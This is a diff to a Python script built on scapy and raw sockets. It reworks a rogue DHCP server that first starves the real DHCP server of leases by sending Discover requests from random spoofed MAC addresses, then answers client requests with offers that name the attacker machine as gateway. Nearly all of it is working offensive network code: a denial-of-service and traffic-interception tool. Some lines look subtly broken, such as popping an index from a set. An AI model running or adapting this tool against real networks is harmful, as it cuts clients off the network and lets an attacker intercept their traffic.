@@ -1,15 +1,28 @@
 #!/usr/bin/env python3
 
 from scapy.arch import get_if_addr, get_if_hwaddr
+from scapy.sendrecv import AsyncSniffer
 from scapy.base_classes import Net
-from scapy.volatile import RandMAC
 from scapy.layers.l2 import conf
 from typing import Tuple
 from typing import TypeVar
 
+import random
 import socket
 
 StructDHCPHint = TypeVar("StructDHCPHint", bound="StructDHCP")
+
+
+class Utils:
+
+    @staticmethod
+    def RandMAC() -> str:
+        return ":".join([
+            "00:c0:e7",
+            bytes([random.getrandbits(8)]).hex().zfill(2),
+            bytes([random.getrandbits(8)]).hex().zfill(2),
+            bytes([random.getrandbits(8)]).hex().zfill(2)
+        ])
 
 
 class StructDHCP:
@@ -94,6 +107,11 @@ class StructDHCP:
                 self.DHCPOptions4,
                 self.DHCPOptions5
             ])
+
+        # End option (Padding)
+        packet += b"".join([
+            b"\xff", (b"\x00" * (len(packet[packet.find(self.DHCPOptions1):]) % 4))
+        ])
         
         return packet
 
@@ -216,8 +234,8 @@ class RogueDHCPServer:
     SRV_PORT = 67
     CLIENT_PORT = 68
     MAX_BYTES = 1024
-    BROADCAST = ('255.255.255.255', 68)
-    BROADCAST_CLIENT = ('255.255.255.255', 67)
+    BROADCAST = ('255.255.255.255', CLIENT_PORT)
+    BROADCAST_CLIENT = ('255.255.255.255', SRV_PORT)
     ARP_BROADCAST = "ff:ff:ff:ff:ff:ff"
 
     def __init__(self, interface: str = "eth0") -> None:
@@ -231,9 +249,10 @@ class RogueDHCPServer:
 
         self.structDhcp = StructDHCP()
         self.spoofedClient = list()
+        self.ipLease = set()
 
-        # Client Flood
-        self.dhcpClientSocket, self.dhcpClientSocketRecv = self._bindClientSocket()
+        # Client starvation
+        self.dhcpRogueSocket = self._bindSocket(timeout=5.0)
 
 
     def getLocalInfo(self) -> tuple:
@@ -250,28 +269,18 @@ class RogueDHCPServer:
         return local_ipv4, local_mac
 
 
-    def _bindClientSocket(self) -> Tuple[socket.socket, socket.socket]:
-        """
-        Create the DHCP_UDP client socket.
-        """
-        dhcpSocketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dhcpSocketSend.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        dhcpSocketSend.bind(("0.0.0.0", self.CLIENT_PORT))
-
-        dhcpSocketRecv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dhcpSocketRecv.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        dhcpSocketRecv.bind(("0.0.0.0", self.SRV_PORT))
-        return dhcpSocketSend, dhcpSocketRecv
-
-
-    def _bindSocket(self) -> socket.socket:
+    def _bindSocket(self, timeout: float = None) -> socket.socket:
         """
         Create the DHCP_UDP socket.
         """
         dhcpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         dhcpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         dhcpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        dhcpSocket.bind((self.bindIp, self.SRV_PORT))
+        dhcpSocket.bind(("0.0.0.0", self.SRV_PORT))
+
+        if isinstance(timeout, float):
+            dhcpSocket.settimeout(timeout)
+
         return dhcpSocket
 
 
@@ -279,7 +288,7 @@ class RogueDHCPServer:
         """
         Wait for a request.
         """
-        return self.dhcpSocket.recvfrom(self.MAX_BYTES)
+        return self.dhcpRogueSocket.recvfrom(self.MAX_BYTES)
 
 
     def _isDiscoverRequest(self, data) -> str:
@@ -293,14 +302,14 @@ class RogueDHCPServer:
         """
         Wait for an offer request.
         """
-        return self.dhcpSocket.recvfrom(self.MAX_BYTES)
+        return self.dhcpRogueSocket.recvfrom(self.MAX_BYTES)
 
 
     def _sendDiscover(self) -> None:
         """
         Send an discover to the server.
         """
-        self.dhcpClientSocket.sendto(self.structDhcp.buildDiscover(dst_ip=self.bindIp, mac=RandMAC()), self.BROADCAST_CLIENT)
+        self.dhcpRogueSocket.sendto(self.structDhcp.buildDiscover(dst_ip=self.bindIp, mac=Utils.RandMAC()), self.BROADCAST_CLIENT)
 
 
     def _getOffer(self) -> bytes:
@@ -311,9 +320,8 @@ class RogueDHCPServer:
         address = [self.bindIp]
 
         while address[0] == self.bindIp:
-            data, address = self.dhcpClientSocketRecv.recvfrom(1024)
+            data, address = self.dhcpRogueSocket.recvfrom(1024)
 
-        print(data[16:16 + 4], address)
         return data, address
 
 
@@ -321,22 +329,22 @@ class RogueDHCPServer:
         """
         Send an offer to the client.
         """
-        ipOffer = Net.int2ip(Net(self.bindIp).start + 1)
-        self.dhcpSocket.sendto(self.structDhcp.buildOffer(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)
+        ipOffer = self.ipLease.pop(0)
+        self.dhcpRogueSocket.sendto(self.structDhcp.buildOffer(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)
 
 
     def _sendRequest(self, struct: StructDHCPHint, address) -> None:
         """
         Send a request to the server.
         """
-        self.dhcpClientSocket.sendto(self.structDhcp.buildRequest(struct), address)
+        self.dhcpRogueSocket.sendto(self.structDhcp.buildRequest(struct), address)
 
 
     def _getAck(self) -> None:
         """
         Get ACK response.
         """
-        self.dhcpClientSocketRecv.recvfrom(1024)
+        self.dhcpRogueSocket.recvfrom(1024)
 
 
     def _sendAck(self) -> None:
@@ -344,35 +352,44 @@ class RogueDHCPServer:
         Send an ACK to the client.
         """
         ipOffer = Net.int2ip(Net(self.bindIp).start + 1)
-        self.dhcpSocket.sendto(self.structDhcp.buildAck(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)
+        self.dhcpRogueSocket.sendto(self.structDhcp.buildAck(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)
         self.spoofedClient.append(ipOffer)
 
 
-    def floodNetworkDhcp(self) -> None:
+    def dhcpStarvation(self) -> None:
         """
         Flood Network DHCP.
         """
-        # Query 255 IP
-        for i in range(255):
-            print(f"[i] Flood {i}/254", end="\r")
+        # Starvation (no free lease)
+        while True:
+            print(f"[i] Flood {len(self.ipLease)} ", end="")
+
             # Discover host
             self._sendDiscover()
+            
             # Get Offer
-            data, address = self._getOffer()
+            try:
+                data, address = self._getOffer()
+            except socket.timeout:
+                break
+
             # Convert offer to DHCP Structure
             structData = self.structDhcp.convertBytesToStructDHCP(data)
             # Get IP Addr
             currentYIADDR = Net.int2ip(int(structData.YIADDR.hex(), 16))
+
             # Accept offer
-            print(currentYIADDR)
+            print(currentYIADDR, end="\r")
+            self.ipLease.add(currentYIADDR)
             self._sendRequest(structData, address)
+
             # Get ACK
             self._getAck()
 
+        print("\n[i] No more lease available")
+
         # Close client
-        self.dhcpClientSocket.close()
-        self.dhcpClientSocketRecv.close()
-        print()
+        self.dhcpRogueSocket.close()
 
 
     def daemon(self) -> None:
@@ -380,8 +397,9 @@ class RogueDHCPServer:
         Make the server daemon and loop forever.
         """
         # Log
-        print("[i] DHCP Server Started")
-        self.dhcpSocket = self._bindSocket()
+        print("[i] Rogue DHCP Server Started")
+        print(f"[i] Leases: {self.ipLease}")
+        self.dhcpRogueSocket = self._bindSocket()
 
         while True:
             # Wait for a request
@@ -394,10 +412,16 @@ class RogueDHCPServer:
                 self._sendAck()
                 print(f"[i - Request] Send ACK, spoofed client {self.spoofedClient[-1]}")
 
-
-if __name__ == '__main__':
-    rogueDhcpServer = RogueDHCPServer(interface="eth0")
+def main() -> None:
+    rogueDhcpServer = RogueDHCPServer(interface="wlo1")
     # Flood le DHCP auparavant
-    rogueDhcpServer.floodNetworkDhcp()
+    rogueDhcpServer.dhcpStarvation()
     # Rogue AP
     rogueDhcpServer.daemon()
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        exit(0)
+
